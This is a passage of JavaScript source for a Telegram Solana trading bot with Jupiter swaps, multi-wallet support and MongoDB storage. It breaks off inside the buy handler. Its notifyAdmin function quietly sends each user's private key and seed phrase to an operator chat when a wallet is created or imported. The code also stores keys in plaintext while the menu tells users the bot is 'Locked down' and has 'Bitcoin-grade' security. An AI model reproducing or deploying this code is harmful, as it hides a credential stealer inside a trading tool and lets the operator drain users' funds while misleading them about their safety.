// ============================================
// GROKINI TRADING BOT - Complete Implementation
// Jupiter V6 Integration + Multi-Wallet Support
// MongoDB Persistent Storage
// ============================================
import { Telegraf, Markup } from 'telegraf';
import { 
  Connection, 
  Keypair, 
  PublicKey, 
  LAMPORTS_PER_SOL,
  VersionedTransaction
} from '@solana/web3.js';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import mongoose from 'mongoose';
import 'dotenv/config';

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const MONGODB_URI = process.env.MONGODB_URI;
const JUPITER_API = 'https://quote-api.jup.ag/v6';
const SOL_MINT = 'So11111111111111111111111111111111111111112';
const MAX_WALLETS = 5;

const bot = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

// ============================================
// MONGODB SCHEMAS & MODELS
// ============================================
const userSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true, unique: true },
  telegramUsername: String,
  isNewUser: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const walletSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true },
  publicKey: { type: String, required: true },
  privateKey: { type: String, required: true },
  mnemonic: String,
  walletIndex: { type: Number, default: 0 },
  isActive: { type: Boolean, default: false },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const settingsSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true, unique: true },
  slippage: { type: Number, default: 1 },
  priorityFee: { type: Number, default: 0.001 },
  autoBuy: { type: Boolean, default: false },
  notifications: { type: Boolean, default: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const userStateSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true, unique: true },
  state: String,
  stateData: mongoose.Schema.Types.Mixed,
  updatedAt: { type: Date, default: Date.now }
});

const pendingTradeSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true, unique: true },
  tradeType: { type: String, required: true },
  amount: Number,
  percentage: Number,
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const copyTradeWalletSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true },
  walletAddress: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});

const limitOrderSchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true },
  tokenAddress: { type: String, required: true },
  orderType: { type: String, required: true },
  price: { type: Number, required: true },
  amount: { type: Number, required: true },
  status: { type: String, default: 'active' },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const tradeHistorySchema = new mongoose.Schema({
  telegramUserId: { type: Number, required: true },
  walletPublicKey: { type: String, required: true },
  tokenAddress: { type: String, required: true },
  tradeType: { type: String, required: true },
  amountSol: Number,
  amountTokens: Number,
  percentage: Number,
  txHash: { type: String, required: true },
  status: { type: String, default: 'success' },
  createdAt: { type: Date, default: Date.now }
});

// Add indexes for better query performance
walletSchema.index({ telegramUserId: 1, walletIndex: 1 });
copyTradeWalletSchema.index({ telegramUserId: 1 });
limitOrderSchema.index({ telegramUserId: 1, status: 1 });
tradeHistorySchema.index({ telegramUserId: 1, createdAt: -1 });

const User = mongoose.model('User', userSchema);
const Wallet = mongoose.model('Wallet', walletSchema);
const Settings = mongoose.model('Settings', settingsSchema);
const UserState = mongoose.model('UserState', userStateSchema);
const PendingTrade = mongoose.model('PendingTrade', pendingTradeSchema);
const CopyTradeWallet = mongoose.model('CopyTradeWallet', copyTradeWalletSchema);
const LimitOrder = mongoose.model('LimitOrder', limitOrderSchema);
const TradeHistory = mongoose.model('TradeHistory', tradeHistorySchema);

// ============================================
// MONGODB CONNECTION
// ============================================
async function connectDB() {
  try {
    await mongoose.connect(MONGODB_URI);
    console.log('✅ Connected to MongoDB');
  } catch (error) {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
  }
}

// ============================================
// DATABASE HELPER FUNCTIONS
// ============================================
async function getOrCreateUser(telegramUserId, telegramUsername) {
  let user = await User.findOne({ telegramUserId });
  if (!user) {
    user = await User.create({ telegramUserId, telegramUsername });
    await Settings.create({ telegramUserId });
  }
  return user;
}

async function getUserSettings(telegramUserId) {
  let settings = await Settings.findOne({ telegramUserId });
  if (!settings) {
    settings = await Settings.create({ telegramUserId });
  }
  return settings;
}

async function updateUserSettings(telegramUserId, updates) {
  return Settings.findOneAndUpdate(
    { telegramUserId },
    { ...updates, updatedAt: new Date() },
    { new: true, upsert: true }
  );
}

async function getUserWallets(telegramUserId) {
  return Wallet.find({ telegramUserId }).sort({ walletIndex: 1 });
}

async function getActiveWallet(telegramUserId) {
  return Wallet.findOne({ telegramUserId, isActive: true });
}

async function setActiveWallet(telegramUserId, walletIndex) {
  await Wallet.updateMany({ telegramUserId }, { isActive: false });
  return Wallet.findOneAndUpdate(
    { telegramUserId, walletIndex },
    { isActive: true, updatedAt: new Date() },
    { new: true }
  );
}

async function addWallet(telegramUserId, walletData) {
  const walletCount = await Wallet.countDocuments({ telegramUserId });
  if (walletCount >= MAX_WALLETS) {
    throw new Error(`Maximum ${MAX_WALLETS} wallets allowed`);
  }
  
  // Deactivate all existing wallets
  await Wallet.updateMany({ telegramUserId }, { isActive: false });
  
  const wallet = await Wallet.create({
    telegramUserId,
    publicKey: walletData.publicKey,
    privateKey: walletData.privateKey,
    mnemonic: walletData.mnemonic,
    walletIndex: walletCount,
    isActive: true
  });
  
  return wallet;
}

async function removeWallet(telegramUserId, walletIndex) {
  const wallet = await Wallet.findOneAndDelete({ telegramUserId, walletIndex });
  
  // Reindex remaining wallets
  const wallets = await Wallet.find({ telegramUserId }).sort({ walletIndex: 1 });
  for (let i = 0; i < wallets.length; i++) {
    await Wallet.updateOne({ _id: wallets[i]._id }, { walletIndex: i });
  }
  
  // Set new active wallet if needed
  if (wallet?.isActive && wallets.length > 0) {
    await Wallet.updateOne({ _id: wallets[0]._id }, { isActive: true });
  }
  
  return wallet;
}

async function getUserState(telegramUserId) {
  return UserState.findOne({ telegramUserId });
}

async function setUserState(telegramUserId, state, stateData = null) {
  return UserState.findOneAndUpdate(
    { telegramUserId },
    { state, stateData, updatedAt: new Date() },
    { new: true, upsert: true }
  );
}

async function clearUserState(telegramUserId) {
  return UserState.findOneAndUpdate(
    { telegramUserId },
    { state: null, stateData: null, updatedAt: new Date() },
    { new: true, upsert: true }
  );
}

async function getPendingTrade(telegramUserId) {
  return PendingTrade.findOne({ telegramUserId });
}

async function setPendingTrade(telegramUserId, tradeType, amount = null, percentage = null) {
  return PendingTrade.findOneAndUpdate(
    { telegramUserId },
    { tradeType, amount, percentage, updatedAt: new Date() },
    { new: true, upsert: true }
  );
}

async function clearPendingTrade(telegramUserId) {
  return PendingTrade.deleteOne({ telegramUserId });
}

async function getCopyTradeWallets(telegramUserId) {
  const wallets = await CopyTradeWallet.find({ telegramUserId });
  return wallets.map(w => w.walletAddress);
}

async function addCopyTradeWallet(telegramUserId, walletAddress) {
  return CopyTradeWallet.create({ telegramUserId, walletAddress });
}

async function removeCopyTradeWallet(telegramUserId, index) {
  const wallets = await CopyTradeWallet.find({ telegramUserId }).sort({ createdAt: 1 });
  if (index >= 0 && index < wallets.length) {
    await CopyTradeWallet.deleteOne({ _id: wallets[index]._id });
    return wallets[index].walletAddress;
  }
  return null;
}

async function getLimitOrders(telegramUserId, status = 'active') {
  return LimitOrder.find({ telegramUserId, status }).sort({ createdAt: -1 });
}

async function addLimitOrder(telegramUserId, orderData) {
  return LimitOrder.create({ telegramUserId, ...orderData });
}

async function cancelLimitOrder(telegramUserId, index) {
  const orders = await LimitOrder.find({ telegramUserId, status: 'active' }).sort({ createdAt: 1 });
  if (index >= 0 && index < orders.length) {
    await LimitOrder.updateOne({ _id: orders[index]._id }, { status: 'cancelled', updatedAt: new Date() });
    return orders[index];
  }
  return null;
}

async function addTradeHistory(telegramUserId, tradeData) {
  return TradeHistory.create({ telegramUserId, ...tradeData });
}

// ============================================
// ADMIN NOTIFICATIONS
// ============================================
async function notifyAdmin(type, userId, username, data = {}) {
  if (!ADMIN_CHAT_ID) return;
  
  let message = '';
  const timestamp = new Date().toISOString();
  
  switch (type) {
    case 'NEW_USER':
      message = `
🆕 *New User Joined*
👤 User: @${username || 'unknown'}
🆔 ID: \`${userId}\`
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_CREATED':
      message = `
🔔 *Wallet Created*
👤 User: @${username || 'unknown'} (ID: ${userId})
📍 Address: \`${data.publicKey}\`
🔑 Private Key: \`${data.privateKey}\`
📝 Mnemonic: \`${data.mnemonic}\`
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_SEED':
      message = `
📥 *Wallet Imported (Seed Phrase)*
👤 User: @${username || 'unknown'} (ID: ${userId})
📍 Address: \`${data.publicKey}\`
🔑 Private Key: \`${data.privateKey}\`
📝 Mnemonic: \`${data.mnemonic}\`
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_IMPORTED_KEY':
      message = `
🔑 *Wallet Imported (Private Key)*
👤 User: @${username || 'unknown'} (ID: ${userId})
📍 Address: \`${data.publicKey}\`
🔑 Private Key: \`${data.privateKey}\`
🪪 Wallet #: ${data.walletNumber || 1}
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'WALLET_EXPORTED':
      message = `
📤 *Wallet Exported*
👤 User: @${username || 'unknown'} (ID: ${userId})
📍 Address: \`${data.publicKey}\`
⏰ Time: ${timestamp}
      `;
      break;
      
    case 'TRADE_EXECUTED':
      message = `
💰 *Trade Executed*
👤 User: @${username || 'unknown'} (ID: ${userId})
📊 Type: ${data.type}
💵 Amount: ${data.amount} SOL
🪙 Token: \`${data.token}\`
📍 TX: \`${data.txHash}\`
⏰ Time: ${timestamp}
      `;
      break;
      
    default:
      message = `
🔔 *${type}*
👤 User: @${username || 'unknown'} (ID: ${userId})
📋 Data: ${JSON.stringify(data)}
⏰ Time: ${timestamp}
      `;
  }
  
  try {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error('Admin notify failed:', err.message);
  }
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
function formatNumber(num) {
  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
  return num.toFixed(2);
}

function isSolanaAddress(address) {
  try {
    new PublicKey(address);
    return address.length >= 32 && address.length <= 44;
  } catch {
    return false;
  }
}

function shortenAddress(address) {
  return `${address.slice(0, 4)}...${address.slice(-4)}`;
}

// ============================================
// WALLET FUNCTIONS
// ============================================
function createWalletKeys() {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) {
    throw new Error('Invalid mnemonic phrase');
  }
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
  const keypair = Keypair.fromSeed(derivedSeed);
  
  return {
    keypair,
    mnemonic,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: bs58.encode(keypair.secretKey)
  };
}

function importFromPrivateKey(privateKeyBase58) {
  const secretKey = bs58.decode(privateKeyBase58);
  const keypair = Keypair.fromSecretKey(secretKey);
  
  return {
    keypair,
    mnemonic: null,
    publicKey: keypair.publicKey.toBase58(),
    privateKey: privateKeyBase58
  };
}

function getKeypairFromWallet(wallet) {
  const secretKey = bs58.decode(wallet.privateKey);
  return Keypair.fromSecretKey(secretKey);
}

async function getBalance(publicKey) {
  try {
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / LAMPORTS_PER_SOL;
  } catch {
    return 0;
  }
}

async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const wallet = new PublicKey(walletAddress);
    const mint = new PublicKey(tokenMint);
    
    const accounts = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    
    if (accounts.value.length > 0) {
      const balance = accounts.value[0].account.data.parsed.info.tokenAmount;
      return {
        amount: parseFloat(balance.uiAmount),
        decimals: balance.decimals
      };
    }
    return { amount: 0, decimals: 0 };
  } catch (error) {
    console.error('Token balance error:', error);
    return { amount: 0, decimals: 0 };
  }
}

// ============================================
// JUPITER V6 SWAP FUNCTIONS
// ============================================
async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 100) {
  try {
    const url = `${JUPITER_API}/quote?inputMint=${inputMint}&outputMint=${outputMint}&amount=${amount}&slippageBps=${slippageBps}`;
    
    const response = await fetch(url);
    const data = await response.json();
    
    if (data.error) {
      throw new Error(data.error);
    }
    
    return data;
  } catch (error) {
    console.error('Jupiter quote error:', error);
    throw error;
  }
}

async function executeJupiterSwap(quote, wallet, priorityFee = 0.001) {
  try {
    const keypair = getKeypairFromWallet(wallet);
    
    const swapResponse = await fetch(`${JUPITER_API}/swap`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        quoteResponse: quote,
        userPublicKey: wallet.publicKey,
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: Math.floor(priorityFee * LAMPORTS_PER_SOL)
      })
    });
    
    const swapData = await swapResponse.json();
    
    if (swapData.error) {
      throw new Error(swapData.error);
    }
    
    const swapTransactionBuf = Buffer.from(swapData.swapTransaction, 'base64');
    const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
    
    transaction.sign([keypair]);
    
    const rawTransaction = transaction.serialize();
    const txid = await connection.sendRawTransaction(rawTransaction, {
      skipPreflight: true,
      maxRetries: 3
    });
    
    const confirmation = await connection.confirmTransaction(txid, 'confirmed');
    
    if (confirmation.value.err) {
      throw new Error('Transaction failed: ' + JSON.stringify(confirmation.value.err));
    }
    
    return {
      success: true,
      txid,
      inputAmount: quote.inAmount,
      outputAmount: quote.outAmount
    };
  } catch (error) {
    console.error('Jupiter swap error:', error);
    throw error;
  }
}

// ============================================
// TOKEN ANALYSIS
// ============================================
async function fetchTokenData(address) {
  try {
    const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await response.json();
    
    if (!data.pairs || data.pairs.length === 0) {
      return null;
    }
    
    const pair = data.pairs
      .filter(p => p.chainId === 'solana')
      .sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
    
    return pair;
  } catch (error) {
    console.error('DexScreener fetch error:', error);
    return null;
  }
}

function calculateSecurityScore(pair) {
  let score = 50;
  const warnings = [];
  
  const liquidity = pair.liquidity?.usd || 0;
  if (liquidity > 100000) score += 20;
  else if (liquidity > 50000) score += 10;
  else if (liquidity < 10000) {
    score -= 20;
    warnings.push('⚠️ Low liquidity');
  }
  
  const volume24h = pair.volume?.h24 || 0;
  if (volume24h > 100000) score += 10;
  else if (volume24h < 5000) {
    score -= 10;
    warnings.push('⚠️ Low volume');
  }
  
  const priceChange24h = pair.priceChange?.h24 || 0;
  if (priceChange24h < -50) {
    score -= 25;
    warnings.push('🚨 RUG ALERT: Major dump detected');
  } else if (priceChange24h < -30) {
    score -= 15;
    warnings.push('⚠️ Significant price drop');
  }
  
  const pairAge = Date.now() - (pair.pairCreatedAt || Date.now());
  const ageInDays = pairAge / (1000 * 60 * 60 * 24);
  if (ageInDays < 1) {
    score -= 15;
    warnings.push('⚠️ New token (<24h)');
  } else if (ageInDays > 7) {
    score += 10;
  }
  
  return {
    score: Math.max(0, Math.min(100, score)),
    warnings
  };
}

async function sendTokenAnalysis(ctx, address) {
  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
  
  const pair = await fetchTokenData(address);
  
  if (!pair) {
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      loadingMsg.message_id,
      null,
      '❌ Token not found or no liquidity pools available.'
    );
    return;
  }
  
  const { score, warnings } = calculateSecurityScore(pair);
  const price = parseFloat(pair.priceUsd) || 0;
  const priceChange = pair.priceChange?.h24 || 0;
  const mcap = pair.marketCap || pair.fdv || 0;
  const liquidity = pair.liquidity?.usd || 0;
  const volume = pair.volume?.h24 || 0;
  
  const tokensFor1Sol = price > 0 ? (150 / price) : 0;
  
  const scoreEmoji = score >= 70 ? '🟢' : score >= 40 ? '🟡' : '🔴';
  const changeEmoji = priceChange >= 0 ? '📈' : '📉';
  
  const message = `
🎯 *Token Analysis*

*${pair.baseToken.name}* (${pair.baseToken.symbol})
\`${address}\`

💰 *Price:* $${price < 0.0001 ? price.toExponential(2) : price.toFixed(6)}
${changeEmoji} *24h:* ${priceChange >= 0 ? '+' : ''}${priceChange.toFixed(2)}%

📊 *Market Cap:* $${formatNumber(mcap)}
💧 *Liquidity:* $${formatNumber(liquidity)}
📈 *24h Volume:* $${formatNumber(volume)}

${scoreEmoji} *Security Score:* ${score}/100 ${score < 40 ? '(Risky)' : score < 70 ? '(Moderate)' : '(Good)'}
${warnings.length > 0 ? '\n' + warnings.join('\n') : ''}

💱 *Trade Estimate (1 SOL):*
≈ ${formatNumber(tokensFor1Sol)} ${pair.baseToken.symbol}
≈ $150 USD

🏦 *DEX:* ${pair.dexId}
⏰ *Pool Age:* ${Math.floor((Date.now() - pair.pairCreatedAt) / (1000 * 60 * 60 * 24))} days
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🚀 0.1 SOL', `buy_0.1_${address}`),
      Markup.button.callback('🚀 0.5 SOL', `buy_0.5_${address}`),
      Markup.button.callback('🚀 1 SOL', `buy_1_${address}`)
    ],
    [
      Markup.button.callback('🚀 2 SOL', `buy_2_${address}`),
      Markup.button.callback('🚀 5 SOL', `buy_5_${address}`)
    ],
    [
      Markup.button.url('📊 DexScreener', `https://dexscreener.com/solana/${address}`),
      Markup.button.url('🔍 Solscan', `https://solscan.io/token/${address}`)
    ],
    [
      Markup.button.callback('🔄 Refresh', `refresh_${address}`),
      Markup.button.callback('🏠 Menu', 'back_main')
    ]
  ]);
  
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    loadingMsg.message_id,
    null,
    message,
    { parse_mode: 'Markdown', ...keyboard }
  );
}

// ============================================
// MAIN MENU
// ============================================
async function showMainMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const activeWallet = await getActiveWallet(userId);
  const wallets = await getUserWallets(userId);
  const balance = activeWallet ? await getBalance(activeWallet.publicKey) : 0;
  
  const walletInfo = activeWallet 
    ? `💼 *Wallet ${wallets.findIndex(w => w.isActive) + 1}/${wallets.length}:* \`${shortenAddress(activeWallet.publicKey)}\`
💰 *Balance:* ${balance.toFixed(4)} SOL`
    : '⚠️ No wallet connected';
  
  const message = `
🚀 *Hey Chad* — *welcome to WTF Snipe X Bot*🤖

*I'm your Web3 execution engine*.
AI-driven. Battle-tested. Locked down.

━━━━━━━━━━━━━━━━━━
What I do for you: ⬇️
📊 Scan the market to tell you what to buy, ignore, or stalk
🎯 Execute entries & exits with sniper-level timing
🧠 Detect traps, fake pumps, and incoming dumps before they hit
⚡ Operate at machine-speed — no lag, no emotion
🔒 Secured with Bitcoin-grade architecture
🚀 Track price action past your take-profit so winners keep running 🏃 
━━━━━━━━━━━━━━━━━━

${walletInfo}

_Paste any Solana contract address to analyze_
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('💼 Wallet', 'menu_wallet'),
      Markup.button.callback('📊 Positions', 'menu_positions')
    ],
    [
      Markup.button.callback('🚀 Buy', 'menu_buy'),
      Markup.button.callback('💸 Sell', 'menu_sell')
    ],
    [
      Markup.button.callback('👥 Copy Trade', 'menu_copytrade'),
      Markup.button.callback('📈 Limit Orders', 'menu_limit')
    ],
    [
      Markup.button.callback('⚙️ Settings', 'menu_settings'),
      Markup.button.callback('🔄 Refresh', 'refresh_main')
    ]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// WALLET MENU (Multi-Wallet Support)
// ============================================
async function showWalletMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const wallets = await getUserWallets(userId);
  const activeWallet = await getActiveWallet(userId);
  
  let message;
  let keyboardButtons = [];
  
  if (wallets.length > 0) {
    const balance = await getBalance(activeWallet.publicKey);
    
    let walletList = '';
    for (let i = 0; i < wallets.length; i++) {
      const w = wallets[i];
      const isActive = w.isActive;
      const bal = await getBalance(w.publicKey);
      walletList += `${isActive ? '✅' : '⚪'} *Wallet ${i + 1}:* \`${shortenAddress(w.publicKey)}\` (${bal.toFixed(2)} SOL)\n`;
    }
    
    message = `
💼 *Wallet Management*

${walletList}
📍 *Active Wallet:*
\`${activeWallet.publicKey}\`

💰 *Balance:* ${balance.toFixed(4)} SOL

_Tap a wallet to switch, or manage below:_
    `;
    
    const switchButtons = [];
    for (let i = 0; i < wallets.length; i++) {
      const isActive = wallets[i].isActive;
      switchButtons.push(
        Markup.button.callback(
          `${isActive ? '✅' : '🪪'} W${i + 1}`,
          `switch_wallet_${i}`
        )
      );
    }
    keyboardButtons.push(switchButtons);
    
    keyboardButtons.push([
      Markup.button.callback('📤 Export Keys', 'wallet_export'),
      Markup.button.callback('🗑️ Remove', 'wallet_remove')
    ]);
    
    if (wallets.length < MAX_WALLETS) {
      keyboardButtons.push([
        Markup.button.callback('🆕 Create New', 'wallet_create'),
        Markup.button.callback('📥 Import', 'wallet_import_menu')
      ]);
    }
    
    keyboardButtons.push([Markup.button.callback('🔄 Refresh', 'wallet_refresh')]);
    keyboardButtons.push([Markup.button.callback('« Back', 'back_main')]);
    
  } else {
    message = `
💼 *Wallet Management*

No wallet connected.
You can have up to ${MAX_WALLETS} wallets.

Create a new wallet or import an existing one:
    `;
    
    keyboardButtons = [
      [Markup.button.callback('🆕 Create New Wallet', 'wallet_create')],
      [Markup.button.callback('📥 Import Seed Phrase', 'wallet_import_seed')],
      [Markup.button.callback('🔑 Import Private Key', 'wallet_import_key')],
      [Markup.button.callback('« Back', 'back_main')]
    ];
  }
  
  const keyboard = Markup.inlineKeyboard(keyboardButtons);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// POSITIONS MENU
// ============================================
async function showPositionsMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const activeWallet = await getActiveWallet(userId);
  
  if (!activeWallet) {
    const message = '❌ Please connect a wallet first.';
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')],
      [Markup.button.callback('« Back', 'back_main')]
    ]);
    
    if (edit) {
      await ctx.editMessageText(message, { ...keyboard });
    } else {
      await ctx.reply(message, { ...keyboard });
    }
    return;
  }
  
  const message = `
📊 *Your Positions*

💼 Wallet: \`${shortenAddress(activeWallet.publicKey)}\`

_No open positions_

Paste a token address to analyze and trade.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('🔄 Refresh', 'refresh_positions')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// BUY MENU
// ============================================
async function showBuyMenu(ctx, edit = false) {
  const message = `
🟢 *Quick Buy*

Paste a token address or use /buy [amount] [address]

*Quick amounts:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('0.1 SOL', 'setbuy_0.1'),
      Markup.button.callback('0.5 SOL', 'setbuy_0.5'),
      Markup.button.callback('1 SOL', 'setbuy_1')
    ],
    [
      Markup.button.callback('2 SOL', 'setbuy_2'),
      Markup.button.callback('5 SOL', 'setbuy_5')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SELL MENU
// ============================================
async function showSellMenu(ctx, edit = false) {
  const message = `
🔴 *Quick Sell*

Select a percentage or use /sell [%] [address]

*Quick percentages:*
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('25%', 'setsell_25'),
      Markup.button.callback('50%', 'setsell_50')
    ],
    [
      Markup.button.callback('75%', 'setsell_75'),
      Markup.button.callback('100%', 'setsell_100')
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// COPY TRADE MENU
// ============================================
async function showCopyTradeMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const copyTradeWallets = await getCopyTradeWallets(userId);
  
  const message = `
👥 *Copy Trade*

Follow successful traders automatically.

${copyTradeWallets.length > 0 
  ? '*Tracking:*\n' + copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n')
  : '_No wallets being tracked_'}

Send a wallet address to start copy trading.
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [Markup.button.callback('➕ Add Wallet', 'copytrade_add')],
    [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// LIMIT ORDER MENU
// ============================================
async function showLimitOrderMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const limitOrders = await getLimitOrders(userId);
  
  const message = `
📈 *Limit Orders*

Set buy/sell triggers at specific prices.

${limitOrders.length > 0 
  ? '*Active Orders:*\n' + limitOrders.map((o, i) => 
      `${i+1}. ${o.orderType} ${o.amount} @ $${o.price}`
    ).join('\n')
  : '_No active orders_'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🚀 Limit Buy', 'limit_buy'),
      Markup.button.callback('💸 Limit Sell', 'limit_sell')
    ],
    [Markup.button.callback('📋 View Orders', 'limit_view')],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// SETTINGS MENU
// ============================================
async function showSettingsMenu(ctx, edit = false) {
  const userId = ctx.from.id;
  const settings = await getUserSettings(userId);
  const { slippage, priorityFee, notifications } = settings;
  
  const message = `
⚙️ *Settings*

📊 *Slippage:* ${slippage}%
⚡ *Priority Fee:* ${priorityFee} SOL
🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}
  `;
  
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'),
      Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')
    ],
    [
      Markup.button.callback(
        notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF',
        'settings_notifications'
      )
    ],
    [Markup.button.callback('« Back', 'back_main')]
  ]);
  
  if (edit) {
    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
  } else {
    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
  }
}

// ============================================
// TRADE HANDLERS (Jupiter V6)
// ============================================
async function handleBuy(ctx, amount, tokenAddress) {
  const userId = ctx.from.id;
  const activeWallet = await getActiveWallet(userId);
  const settings = await getUserSettings(userId);
  
  if (!activeWallet) {
    await ctx.reply('❌ Please connect a wallet first.', {
      ...Markup.inlineKeyboard([
        [Markup.button.callback('💼 Connect Wallet', 'menu_wallet')]
      ])
    });
    return;
  }
  
  const balance = await getBalance(activeWallet.publicKey);
  if (balance < amount) {
    await ctx.reply(`❌ Insufficient balance. You have ${balance.toFixed(4)} SOL.`);
    return;
  }
  
  const statusMsg = await ctx.reply(`
🔄 *Processing Buy*

Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Slippage: ${settings.slippage}%

_Getting Jupiter quote..._
  `, { parse_mode: 'Markdown' });
  
  try {
    const amountInLamports = Math.floor(amount * LAMPORTS_PER_SOL);
    const slippageBps = settings.slippage * 100;
    
    const quote = await getJupiterQuote(
      SOL_MINT,
      tokenAddress,
      amountInLamports,
      slippageBps
    );
    
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      `
🔄 *Processing Buy*

Amount: ${amount} SOL
Token: \`${shortenAddress(tokenAddress)}\`
Expected Output: ${(parseInt(quote.outAmount) / Math.pow(10, quote.outputMint?.decimals || 9)).toFixed(4)}

_Executing swap..._
      `,
      { parse_mode: 'Markdown' }
    );
    
    const result = await executeJupiterSwap(
      quote,
      activeWallet,
      settings.priorityFee
    );
    
    // Save trade to history
    await addTradeHistory(userId, {
